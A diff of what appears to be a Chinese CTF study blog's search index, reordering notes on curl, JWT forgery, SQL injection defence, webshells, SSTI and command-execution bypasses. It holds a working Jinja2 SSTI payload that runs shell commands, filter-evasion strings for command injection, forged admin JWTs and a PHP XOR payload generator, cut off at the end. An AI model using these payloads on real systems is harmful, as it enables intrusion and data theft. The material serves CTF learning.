@@ -296,22 +296,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Curl基本使用</title>
-    <url>/2023/10/23/Curl/</url>
-    <content><![CDATA[<p>摘要</p>
-<span id="more"></span>
-
-<h1 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h1><p>1.查询公网IP</p>
-<p>curl ifconfig.co</p>
-<p>curl -v ifconfig.co (显示过程)</p>
-<p>‍</p>
-<p>‍</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-  </entry>
-  <entry>
     <title>信息收集</title>
     <url>/2023/10/23/Google%E8%AF%AD%E6%B3%95/</url>
     <content><![CDATA[<p>摘要</p>
@@ -352,6 +336,22 @@
       </categories>
   </entry>
   <entry>
+    <title>Curl基本使用</title>
+    <url>/2023/10/23/Curl/</url>
+    <content><![CDATA[<p>摘要</p>
+<span id="more"></span>
+
+<h1 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h1><p>1.查询公网IP</p>
+<p>curl ifconfig.co</p>
+<p>curl -v ifconfig.co (显示过程)</p>
+<p>‍</p>
+<p>‍</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
     <title>HTML5新标签及相应的安全分析</title>
     <url>/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>摘要</p>
@@ -371,34 +371,6 @@
 <img src="/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/image-20231020205155-83ukxw3.png" class="" title="image">​
 
 <img src="/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/image-20231020211412-e4kkz2j.png" class="" title="image">​
-
-<p>‍</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>JWT</title>
-    <url>/2023/10/23/JWT/</url>
-    <content><![CDATA[<p>摘要</p>
-<span id="more"></span>
-
-<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="1-注册普通用户，登陆成功后抓包获取jwt的值"><a href="#1-注册普通用户，登陆成功后抓包获取jwt的值" class="headerlink" title="1.注册普通用户，登陆成功后抓包获取jwt的值"></a>1.注册普通用户，登陆成功后抓包获取jwt的值</h2><img src="/2023/10/23/JWT/image-20231008172314-21v9sgn.png" class="" title="image">​
-
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluMSJ9.Os9bQfexyM1GxoY3Q-JlvRLUx0bA-y6FR4Mv6zV_Cuk</p>
-<p>利用工具求出key</p>
-<img src="/2023/10/23/JWT/image-20231008202112-9ld5ct2.png" class="" title="image">​
-
-<p>然后利用网站<a href="https://jwt.io/%E6%9E%84%E9%80%A0%E5%87%BA%E6%96%B0%E7%9A%84jwt">https://jwt.io/构造出新的jwt</a></p>
-<img src="/2023/10/23/JWT/image-20231008202151-b5jb57g.png" class="" title="image">​
-
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.9avq5ApZ-XZul2kbon8z2cB6Y4bNru_0nnIZfJ1mO50</p>
-<p>思路一：利用Editthiscookie插件修改jwt的值，刷新即可得到flag</p>
-<p>思路二：也可以利用bp自带的浏览器，每次都需要修改jwt的值</p>
-<img src="/2023/10/23/JWT/image-20231008202435-c50llij.png" class="" title="image">​
-
-<img src="/2023/10/23/JWT/image-20231008202552-7qqjuf3.png" class="" title="image">​
 
 <p>‍</p>
 ]]></content>
@@ -431,6 +403,34 @@
 <img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231006233317-au4tcvg.png" class="" title="image">​
 
 <p>‍</p>
+<p>‍</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>JWT</title>
+    <url>/2023/10/23/JWT/</url>
+    <content><![CDATA[<p>摘要</p>
+<span id="more"></span>
+
+<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="1-注册普通用户，登陆成功后抓包获取jwt的值"><a href="#1-注册普通用户，登陆成功后抓包获取jwt的值" class="headerlink" title="1.注册普通用户，登陆成功后抓包获取jwt的值"></a>1.注册普通用户，登陆成功后抓包获取jwt的值</h2><img src="/2023/10/23/JWT/image-20231008172314-21v9sgn.png" class="" title="image">​
+
+<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluMSJ9.Os9bQfexyM1GxoY3Q-JlvRLUx0bA-y6FR4Mv6zV_Cuk</p>
+<p>利用工具求出key</p>
+<img src="/2023/10/23/JWT/image-20231008202112-9ld5ct2.png" class="" title="image">​
+
+<p>然后利用网站<a href="https://jwt.io/%E6%9E%84%E9%80%A0%E5%87%BA%E6%96%B0%E7%9A%84jwt">https://jwt.io/构造出新的jwt</a></p>
+<img src="/2023/10/23/JWT/image-20231008202151-b5jb57g.png" class="" title="image">​
+
+<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.9avq5ApZ-XZul2kbon8z2cB6Y4bNru_0nnIZfJ1mO50</p>
+<p>思路一：利用Editthiscookie插件修改jwt的值，刷新即可得到flag</p>
+<p>思路二：也可以利用bp自带的浏览器，每次都需要修改jwt的值</p>
+<img src="/2023/10/23/JWT/image-20231008202435-c50llij.png" class="" title="image">​
+
+<img src="/2023/10/23/JWT/image-20231008202552-7qqjuf3.png" class="" title="image">​
+
 <p>‍</p>
 ]]></content>
       <categories>
@@ -674,67 +674,6 @@
       </categories>
   </entry>
   <entry>
-    <title>SQL注入防御</title>
-    <url>/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/</url>
-    <content><![CDATA[<p>摘要</p>
-<span id="more"></span>
-
-<h1 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h1><h2 id="1-原因"><a href="#1-原因" class="headerlink" title="1.原因"></a>1.原因</h2><img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007084910-na22kcj.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007084926-cj41vy3.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007084952-yjplwzb.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085041-p5u4kk5.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085158-xsstgq0.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085242-dygddfl.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085250-7v0mrtt.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085300-lkw1i38.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085647-i2muh3p.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085703-yxfb4v9.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085811-w1ta0n8.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085916-qu422a4.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085937-91fxj4x.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090103-yk0pe1l.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090142-pz5bgwl.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090206-69gw2eb.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090221-kaowt7m.png" class="" title="image">​
-
-<h2 id="2-过滤防御"><a href="#2-过滤防御" class="headerlink" title="2.过滤防御"></a>2.过滤防御</h2><img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090342-2zok2mn.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090359-morxzod.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090430-az7exnc.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090455-gqhf3uc.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090514-rlvt4dm.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090523-l92nh5m.png" class="" title="image">​
-
-<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090645-3i8kp97.png" class="" title="image">​
-
-<p>‍</p>
-<p>‍</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-  </entry>
-  <entry>
     <title>SQL盲注</title>
     <url>/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/</url>
     <content><![CDATA[<p>摘要</p>
@@ -881,6 +820,67 @@
       </categories>
   </entry>
   <entry>
+    <title>SQL注入防御</title>
+    <url>/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/</url>
+    <content><![CDATA[<p>摘要</p>
+<span id="more"></span>
+
+<h1 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h1><h2 id="1-原因"><a href="#1-原因" class="headerlink" title="1.原因"></a>1.原因</h2><img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007084910-na22kcj.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007084926-cj41vy3.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007084952-yjplwzb.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085041-p5u4kk5.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085158-xsstgq0.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085242-dygddfl.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085250-7v0mrtt.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085300-lkw1i38.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085647-i2muh3p.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085703-yxfb4v9.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085811-w1ta0n8.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085916-qu422a4.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085937-91fxj4x.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090103-yk0pe1l.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090142-pz5bgwl.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090206-69gw2eb.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090221-kaowt7m.png" class="" title="image">​
+
+<h2 id="2-过滤防御"><a href="#2-过滤防御" class="headerlink" title="2.过滤防御"></a>2.过滤防御</h2><img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090342-2zok2mn.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090359-morxzod.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090430-az7exnc.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090455-gqhf3uc.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090514-rlvt4dm.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090523-l92nh5m.png" class="" title="image">​
+
+<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090645-3i8kp97.png" class="" title="image">​
+
+<p>‍</p>
+<p>‍</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
     <title>SSTI(服务器端模板注入)</title>
     <url>/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>摘要</p>
@@ -947,75 +947,6 @@
 
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">因为后端没有任何过滤，所以我们可以通过python的内置函数获取<span class="built_in">eval</span>执行任意命令，这个Payload在网上也可以轻易找到</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">	直接粘过去就可以了，要获取flag，就把<span class="built_in">id</span>改成cat /flag即可。Payload放完了，解释下这个Payload的意思</span><br></pre></td></tr></table></figure>
 
-<p>‍</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>WEBshell</title>
-    <url>/2023/10/23/WEBshell/</url>
-    <content><![CDATA[<p>摘要</p>
-<span id="more"></span>
-
-<h1 id="WEBshell"><a href="#WEBshell" class="headerlink" title="WEBshell"></a>WEBshell</h1><img src="/2023/10/23/WEBshell/image-20231006210234-35gseeg.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006210309-dgmx3y6.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006210713-r08hue4.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006210748-9nqzpid.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006210858-y39rnvg.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006211657-j434d2k.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006212145-fu2h3dq.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006212212-z5zp4sf.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006223050-5vk14iz.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006223144-g9xwihg.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006223227-tjlofms.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006223341-qg8emwn.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006223459-t96wtt1.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006223520-hnhmuzd.png" class="" title="image">​
-
-<h2 id="奇技淫巧-隐藏和免杀"><a href="#奇技淫巧-隐藏和免杀" class="headerlink" title="奇技淫巧-隐藏和免杀"></a>奇技淫巧-隐藏和免杀</h2><img src="/2023/10/23/WEBshell/image-20231006224019-fx9a945.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006224135-ebe4wew.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006224157-4hqsveg.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006224240-l0ap0bb.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006224337-wk6qsi0.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006224526-rvlltga.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006224650-95uxg0b.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006225758-ul79ye7.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006225822-hcq34wl.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006225911-1c1zfov.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006225944-vxmd543.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006230104-nsqo9po.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006230147-w3ayqml.png" class="" title="image">​
-
-<img src="/2023/10/23/WEBshell/image-20231006230234-b0folqq.png" class="" title="image">​
-
-<p>‍</p>
 <p>‍</p>
 ]]></content>
       <categories>
@@ -1120,6 +1051,75 @@
 
 <img src="/2023/10/23/XSS/image-20231007203420-ip9opv0.png" class="" title="image">​
 
+<p>‍</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>WEBshell</title>
+    <url>/2023/10/23/WEBshell/</url>
+    <content><![CDATA[<p>摘要</p>
+<span id="more"></span>
+
+<h1 id="WEBshell"><a href="#WEBshell" class="headerlink" title="WEBshell"></a>WEBshell</h1><img src="/2023/10/23/WEBshell/image-20231006210234-35gseeg.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006210309-dgmx3y6.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006210713-r08hue4.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006210748-9nqzpid.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006210858-y39rnvg.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006211657-j434d2k.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006212145-fu2h3dq.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006212212-z5zp4sf.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006223050-5vk14iz.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006223144-g9xwihg.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006223227-tjlofms.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006223341-qg8emwn.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006223459-t96wtt1.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006223520-hnhmuzd.png" class="" title="image">​
+
+<h2 id="奇技淫巧-隐藏和免杀"><a href="#奇技淫巧-隐藏和免杀" class="headerlink" title="奇技淫巧-隐藏和免杀"></a>奇技淫巧-隐藏和免杀</h2><img src="/2023/10/23/WEBshell/image-20231006224019-fx9a945.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006224135-ebe4wew.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006224157-4hqsveg.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006224240-l0ap0bb.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006224337-wk6qsi0.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006224526-rvlltga.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006224650-95uxg0b.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006225758-ul79ye7.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006225822-hcq34wl.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006225911-1c1zfov.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006225944-vxmd543.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006230104-nsqo9po.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006230147-w3ayqml.png" class="" title="image">​
+
+<img src="/2023/10/23/WEBshell/image-20231006230234-b0folqq.png" class="" title="image">​
+
+<p>‍</p>
 <p>‍</p>
 ]]></content>
       <categories>
@@ -1606,80 +1606,6 @@
       </categories>
   </entry>
   <entry>
-    <title>命令执行绕过</title>
-    <url>/2023/10/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>摘要</p>
-<span id="more"></span>
-
-<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><h2 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1.空格绕过"></a>1.空格绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%09</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line"></span><br><span class="line">&lt;</span><br><span class="line"></span><br><span class="line">IFS9 </span><br><span class="line">&#123;IFS&#125; </span><br><span class="line"><span class="variable">$IFS</span> </span><br><span class="line">$IFS<span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行 </span><br><span class="line">IFS </span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来 </span><br><span class="line">%20   (space) </span><br><span class="line">%09   (tab) </span><br><span class="line">X\=<span class="string">&#x27;cat\\x09./flag.php&#x27;</span>;<span class="variable">$X</span>       （\\x09表示tab，也可以用\\x20）</span><br></pre></td></tr></table></figure>
-
-
-
-<p>‍</p>
-<h2 id="2-system函数绕过"><a href="#2-system函数绕过" class="headerlink" title="2.system函数绕过"></a>2.system函数绕过</h2><p>passthru</p>
-<p>‍</p>
-<h2 id="3-cat绕过"><a href="#3-cat绕过" class="headerlink" title="3.cat绕过"></a>3.cat绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">od</span></span><br><span class="line"></span><br><span class="line">less</span><br><span class="line"></span><br><span class="line">more</span><br><span class="line"></span><br><span class="line">使用<span class="built_in">tac</span>反向输出命令： </span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br></pre></td></tr></table></figure>
-
-
-
-<p>‍</p>
-<h2 id="4-无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）"><a href="#4-无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）" class="headerlink" title="4.无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）"></a>4.无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="1）异或"><a href="#1）异或" class="headerlink" title="1）异或"></a>1）<strong>异或</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span 